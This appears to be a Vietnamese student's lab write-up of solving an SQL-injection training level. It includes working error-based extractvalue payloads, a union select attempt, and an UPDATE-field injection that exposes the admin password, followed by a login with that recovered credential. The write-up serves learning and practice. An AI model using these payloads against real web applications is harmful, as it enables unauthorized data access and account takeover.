# <div align="center"><p> SQL-Injection/Level_8</p></div>
 ## Họ và tên: Mai Thị Hoàng Yến
 ## Ngày báo cáo: Ngày 06/5/2022
 ### MỤC LỤC
   [SQL-Injection](#gioithieu)
   
### Nội dung báo cáo 
#### SQL-Injection <a name="gioithieu"></a>
- B1: Đây là trang web của level8 .

  ![image](https://user-images.githubusercontent.com/101852647/167063084-e965f579-3c76-49c0-83c7-56d9beb872ed.png)

-B2: Thử chèn ' vào các vị trí trên bảng edit và thấy chỉ có hàng email là trả về lỗi. Như vậy, chúng ta có thể lợi dụng email để khai thác.

  ![image](https://user-images.githubusercontent.com/101852647/167063222-55ed3e2a-7f12-41ee-aa68-ba035ca5fc18.png)

- B3: Thử nhập lệnh `' union select 1,2#` nhưng vẫn trả về thông báo lỗi.

  ![image](https://user-images.githubusercontent.com/101852647/167063307-8d69d33b-bb8e-4d29-a54b-6c8fa3c01602.png)

- B4: Ta sẽ dùng câu lệnh `' or extractvalue(0x0a,concat(0x0a,(select version()))) or '` để tìm phiên bản.

  ![image](https://user-images.githubusercontent.com/101852647/167063422-13fb7735-e185-43bc-abfc-49a19a52c4b8.png)

- B5: Ta sẽ dùng câu lệnh `' or extractvalue(0x0a,concat(0x0a,(select database()))) or '` để tìm database. Kết quả trả về chúng ta là `hackit`

  ![image](https://user-images.githubusercontent.com/101852647/167063493-d8dc1143-087c-462e-9181-c3699c334bb0.png)

- B6: Ta sẽ dùng câu lệnh `' or extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit  1 OFFSET 2))) or '` để tìm tên table. Nhưng kết quả trả về không ổn.

  ![image](https://user-images.githubusercontent.com/101852647/167063746-3f13eb6a-2557-4c16-afd4-22956fe93ae7.png)

- B7: Bây giờ ta mới để ý lại lỗi ban đầu ta gặp và sẽ dựa vào đó để khai thác. Ta thấy lỗi cú pháp gần `'union select 1,2,3#', icq = '12345', age = '25' WHERE id = 1' ` vậy thì chúng ta sẽ lợi dụng lỗ hổng này để khai thác bằng cách chèn thêm câu lệnh `', name=password,icq='` và kết quả trả về cho chúng ta password ngay ở dòng name.

  ![image](https://user-images.githubusercontent.com/101852647/167063882-c1234756-f062-4e71-82f9-78f38dc3034b.png)
  
  ![image](https://user-images.githubusercontent.com/101852647/167064389-1875abbb-07e6-4ba9-af85-329aadb62db8.png)
  
- B8: Sau kkhi đăng nhập với `username=Admin` và `password=19JPYS1jdgvkj` thì đã đăng nhập thành công.

  ![image](https://user-images.githubusercontent.com/101852647/167064225-57b4d6ca-18ff-44da-b444-d5dc2547ff88.png)




  
